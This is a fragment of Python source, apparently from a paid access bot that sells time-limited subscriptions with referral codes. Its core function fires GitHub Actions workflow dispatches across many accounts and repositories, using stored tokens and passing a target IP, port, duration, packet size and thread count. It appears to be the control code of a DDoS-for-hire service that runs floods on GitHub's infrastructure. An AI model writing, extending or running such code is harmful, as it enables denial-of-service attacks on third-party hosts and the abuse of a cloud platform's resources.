# --- HELPER FUNCTIONS ---

def generate_referral_code(user_id):
    return f"MRX-{str(user_id)[-4:]}-{random.choice(string.ascii_uppercase)}{random.randint(10,99)}"

def is_approved(user_id: int):
    if user_id in approved_users:
        return time.time() < approved_users[user_id]['expiry_time']
    return False

def approve_user(user_id: int, days: int):
    if user_id != ADMIN_ID and days > 365:
        days = 365
    current_expiry = approved_users.get(user_id, {}).get('expiry_time', time.time())
    start_time = max(current_expiry, time.time())
    expiry_time = start_time + (days * 86400)
    if user_id not in approved_users:
        ref_code = generate_referral_code(user_id)
    else:
        ref_code = approved_users[user_id]['ref_code']
    approved_users[user_id] = {'expiry_time': expiry_time, 'approved_days': days, 'ref_code': ref_code}

approve_user(ADMIN_ID, 36500)

async def trigger_all_workflows_async(ip, port, duration):
    params = {"ref": "main", "inputs": {"ip": str(ip), "port": str(port), "duration": str(duration), "packet_size": "64", "threads": "150"}}
    async with aiohttp.ClientSession() as session:
        tasks = []
        for account in GITHUB_ACCOUNTS:
            headers = {"Authorization": f"Bearer {account['token']}", "Accept": "application/vnd.github.v3+json"}
            for repo in account['repos']:
                url = f"https://api.github.com/repos/{repo}/actions/workflows/main.yml/dispatches"
                tasks.append(session.post(url, headers=headers, json=params, timeout=10))
        await asyncio.gather(*tasks, return_exceptions=True)

